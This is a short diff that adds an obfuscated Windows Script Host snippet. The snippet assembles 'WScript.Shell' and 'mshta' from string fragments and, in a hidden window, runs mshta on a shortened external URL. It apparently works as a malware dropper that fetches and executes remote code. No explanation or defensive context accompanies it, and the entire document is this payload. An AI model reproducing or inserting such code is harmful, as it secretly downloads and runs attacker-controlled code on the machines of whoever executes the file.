@@ -1,0 +1,6 @@
+qtmofmfk = ("ipt.Shel")
+var peqngmsh = WScript.CreateObject("WScr"+qtmofmfk+"l")
+wdthfwvj = ("m")
+zksyerbj = ("sh")
+ymvskeph = ("ta ")
+peqngmsh.Run((wdthfwvj+zksyerbj+ymvskeph)+" https://t.ly/ChKM",0)
